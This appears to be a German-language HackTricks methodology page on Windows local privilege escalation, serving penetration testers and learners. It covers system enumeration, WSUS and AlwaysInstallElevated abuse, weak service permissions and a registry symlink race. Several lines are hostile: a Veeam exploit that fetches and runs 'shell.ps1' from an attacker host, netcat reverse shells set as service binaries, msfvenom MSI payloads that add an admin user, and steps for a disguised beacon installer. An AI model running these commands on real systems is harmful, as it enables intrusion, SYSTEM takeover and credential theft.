# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation vectors zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initiale Windows-Theorie

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies zuerst die folgende Seite, bevor du fortfährst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sieh dir die folgende Seite für weitere Informationen über ACLs - DACLs/SACLs/ACEs an:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels in Windows sind, solltest du zuerst die folgende Seite lesen, bevor du fortfährst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die dich **daran hindern könnten, das System zu enumerieren**, Executables auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest diese **Seite** **lesen** und alle diese **Defense-Mechanismen** **enumerieren**, bevor du mit der Privilege-Escalation-Enumeration beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um High IL ohne Prompts zu erreichen, wenn die Secure-Path-Prüfungen von AppInfo umgangen werden. Sieh dir hier den dedizierten UIAccess/Admin-Protection-Bypass-Workflow an:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Propagation der Secure Desktop accessibility registry kann missbraucht werden, um einen beliebigen SYSTEM registry write (RegPwn) durchzuführen:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Systeminfo

### Enumeration der Versionsinfo

Prüfe, ob die Windows-Version eine bekannte vulnerability hat (prüfe auch die angewendeten patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Diese [Site](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen über Microsoft-Sicherheitslücken zu suchen. Diese Datenbank hat mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos von exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Sind irgendwelche Credentials/Juicy-Infos in den Umgebungsvariablen gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Du kannst lernen, wie man dies unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) aktiviert.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details von PowerShell-Pipeline-Ausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teile von Skripten. Allerdings werden vollständige Ausführungsdetails und Ausgaberesultate möglicherweise nicht erfasst.

Um dies zu aktivieren, befolge die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wähle **"Module Logging"** anstelle von **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den PowersShell-Logs anzuzeigen, können Sie ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Eine vollständige Aktivitäts- und Inhaltsaufzeichnung der Ausführung des Skripts wird erfasst, sodass jeder Codeblock dokumentiert wird, während er läuft. Dieser Prozess bewahrt eine umfassende Audit-Trail jeder Aktivität, was für Forensik und die Analyse bösartiger Aktivitäten wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess bereitgestellt.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logging-Ereignisse für den Script Block können im Windows Event Viewer unter dem Pfad gefunden werden: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, kannst du verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet-Einstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S** sondern über http angefordert werden.

Du beginnst damit zu prüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem du Folgendes in cmd ausführst:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn du eine Antwort wie eine dieser erhältst:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann **ist es ausnutzbar.** Wenn der letzte Registry-Wert gleich 0 ist, wird der WSUS-Eintrag ignoriert.

Um diese Vulnerabilities auszunutzen, kannst du Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden - das sind MiTM weaponized exploit scripts, um 'fake' updates in nicht-SSL WSUS-Traffic einzuschleusen.

Lies die Research hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lies den vollständigen Report hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Wesentlichen ist das der Fehler, den dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen User-Proxy zu ändern, und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, haben wir daher die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als privilegierter User auf unserem Asset auszuführen.
>
> Außerdem, da der WSUS-Service die Einstellungen des aktuellen Users verwendet, nutzt er auch seinen Zertifikatsspeicher. Wenn wir ein self-signed Zertifikat für den WSUS-Hostname erzeugen und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Users hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Traffic abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-first-use-Validierung für das Zertifikat zu implementieren. Wenn das präsentierte Zertifikat vom User vertraut wird und den korrekten Hostnamen hat, wird es vom Service akzeptiert.

Du kannst diese Vulnerability mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es liberated ist).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Viele Enterprise-Agenten stellen eine localhost-IPC-Oberfläche und einen privilegierten Update-Kanal bereit. Wenn das Enrollment zu einem Angreifer-Server gezwungen werden kann und der Updater einer Rogue Root CA oder schwachen Signer-Checks vertraut, kann ein lokaler User ein bösartiges MSI ausliefern, das der SYSTEM-Service installiert. Siehe eine verallgemeinerte Technik (basierend auf der Netskope stAgentSvc chain – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen localhost-Service auf **TCP/9401** bereit, der attacker-controlled Messages verarbeitet und damit beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.

- **Recon**: bestätige den Listener und die Version, z. B. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: platziere einen PoC wie `VeeamHax.exe` mit den erforderlichen Veeam-DLLs im selben Verzeichnis und triggere dann eine SYSTEM-Payload über den lokalen Socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.
## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle existiert in Windows **domain**-Umgebungen unter bestimmten Bedingungen. Zu diesen Bedingungen gehören Umgebungen, in denen **LDAP signing nicht erzwungen wird,** Benutzer über Self-Rechte verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und die Fähigkeit der Benutzer, Computer innerhalb der Domain zu erstellen. Es ist wichtig zu beachten, dass diese **requirements** mit **default settings** erfüllt werden.

Finde den **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen über den Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 registers **aktiviert** sind (Wert ist **0x1**), dann können Benutzer jeder **privilege** `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **install**ieren (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn Sie eine meterpreter-Session haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` aus power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Privilegieneskalation zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/Groups auffordert (daher benötigen Sie GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach die erstellte Binärdatei aus, um Privilegien zu eskalieren.

### MSI Wrapper

Lies dieses Tutorial, um zu lernen, wie man einen MSI Wrapper mit diesem tools erstellt. Beachte, dass du eine "**.bat**" Datei wrappen kannst, wenn du **nur** **Befehlszeilen** **ausführen** willst


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Generiere** mit Cobalt Strike oder Metasploit einen **neuen Windows EXE TCP Payload** in `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und gib "installer" in das Suchfeld ein. Wähle das **Setup Wizard** Projekt und klicke **Next**.
- Gib dem Projekt einen Namen, wie **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory**, und klicke **Create**.
- Klicke weiter auf **Next**, bis du bei Schritt 3 von 4 bist (choose files to include). Klicke auf **Add** und wähle den gerade generierten Beacon Payload aus. Klicke dann auf **Finish**.
- Markiere das **AlwaysPrivesc**-Projekt im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Eigenschaften, die du ändern kannst, wie **Author** und **Manufacturer**, wodurch die installierte App legitimer wirken kann.
- Rechtsklicke auf das Projekt und wähle **View > Custom Actions**.
- Rechtsklicke auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass der beacon Payload ausgeführt wird, sobald das Installer-Programm gestartet wird.
- Unter den **Custom Action Properties** ändere **Run64Bit** auf **True**.
- Schließlich **build it**.
- Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 setzt.

### MSI Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, kannst du verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Diese Einstellungen entscheiden, was **protokolliert** wird, also solltest du darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding ist interessant, um zu wissen, wohin die Logs gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung von lokalen Administratorpasswörtern** konzipiert und stellt sicher, dass jedes Passwort **eindeutig, zufällig und regelmäßig aktualisiert** auf Computern ist, die einer Domain beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen ausreichende Berechtigungen über ACLs gewährt wurden, sodass sie lokale Admin-Passwörter anzeigen können, wenn sie autorisiert sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Infos zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, ihren Speicher **auszulesen** oder Code einzuschleusen und das System dadurch weiter abzusichern.\
[**Mehr Infos über LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie Pass-the-Hash-Angriffen zu schützen.| [**Mehr Informationen über Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheits-Paket authentifiziert werden, werden typischerweise Domänenanmeldedaten für den Benutzer erstellt.\
[**Mehr Informationen zu Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen aufzählen

Du solltest überprüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn du **zu einer privilegierten Gruppe gehörst, kannst du möglicherweise Privilegien ausweiten**. Erfahre hier mehr über privilegierte Gruppen und wie man sie missbraucht, um Privilegien auszuweiten:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante Tokens** zu erfahren und wie man sie missbraucht:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwort-Richtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zuerst: Beim Auflisten der Prozesse **prüfe, ob sich Passwörter in der Kommandozeile des Prozesses befinden**.\
Prüfe, ob du **eine laufende Binärdatei überschreiben** kannst oder ob du Schreibberechtigungen für den Binärdatei-Ordner hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Immer nach möglichen laufenden [**electron/cef/chromium debuggers** suchen, du könntest das ausnutzen, um Privilegien zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Berechtigungen der Prozess-Binaries überprüfen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfen der Berechtigungen der Ordner der Prozess-Binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Du kannst mit **procdump** aus Sysinternals einen Memory Dump eines laufenden Prozesses erstellen. Dienste wie FTP haben die **credentials in clear text in memory**; versuche, den Memory Dump zu erstellen und die credentials auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), suche nach "command prompt", klicke auf "Click to open Command Prompt"

## Services

Service Triggers erlauben Windows, einen Service zu starten, wenn bestimmte Bedingungen eintreten (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Auch ohne SERVICE_START-Rechte kann man oft privilegierte Services starten, indem man ihre Trigger auslöst. Siehe Enumeration- und Aktivierungstechniken hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Erhalte eine Liste der Services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen über einen Dienst zu erhalten
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binary **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" einen Service modifizieren können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn du diesen Fehler bekommst (zum Beispiel mit SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Du kannst ihn aktivieren mit
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachten Sie, dass der Dienst upnphost von SSDPSRV abhängt, um zu funktionieren (für XP SP1)**

**Eine weitere Umgehungslösung** für dieses Problem ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Dienst-Binärpfad ändern**

In dem Szenario, in dem die Gruppe "Authenticated users" **SERVICE_ALL_ACCESS** auf einem Dienst besitzt, ist eine Änderung der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu ändern und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können durch verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Erlaubt die Neukonfiguration des Service-Binaries.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit die Fähigkeit, Service-Konfigurationen zu ändern.
- **WRITE_OWNER**: Erlaubt das Übernehmen des Eigentums und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Erbt die Fähigkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Erbt ebenfalls die Fähigkeit, Service-Konfigurationen zu ändern.

Für die Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Services binaries weak permissions

**Prüfe, ob du das Binary, das von einem Service ausgeführt wird, ändern kannst** oder ob du **Schreibrechte auf dem Ordner** hast, in dem sich das Binary befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst jedes Binary, das von einem Service ausgeführt wird, mit **wmic** (nicht in system32) auslesen und deine Berechtigungen mit **icacls** überprüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Du kannst auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienst-Registry-Änderungsberechtigungen

Du solltest prüfen, ob du eine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** über eine Service-**Registry** **prüfen**, indem du:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann die vom Service ausgeführte Binary geändert werden.

Um den Path der ausgeführten Binary zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Einige Windows Accessibility-Funktionen erstellen pro Benutzer **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Session-Key kopiert werden. Ein Registry-**symbolic link race** kann diesen privilegierten Schreibvorgang auf **beliebige HKLM-Pfade** umleiten und damit eine primitive für einen beliebigen HKLM-**value write** liefern.

Wichtige Speicherorte (Beispiel: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Accessibility-Funktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzerkontrollierte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während Logon-/Secure-Desktop-Übergängen erstellt und ist vom Benutzer beschreibbar.

Missbrauchsablauf (CVE-2026-24291 / ATConfig):

1. Fülle den **HKCU ATConfig**-Wert, der von SYSTEM geschrieben werden soll.
2. Trigger den Secure-Desktop-Kopiervorgang (z. B. **LockWorkstation**), der den AT-Broker-Flow startet.
3. **Gewinne das race**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt; wenn das oplock auslöst, ersetze den **HKLM Session ATConfig**-Schlüssel durch einen **registry link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebigen HKLM value write hast, pivotiere zu LPE, indem du Service-Konfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Service, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und trigger ihn nach dem Write. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil des race.

Beispiel-Tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

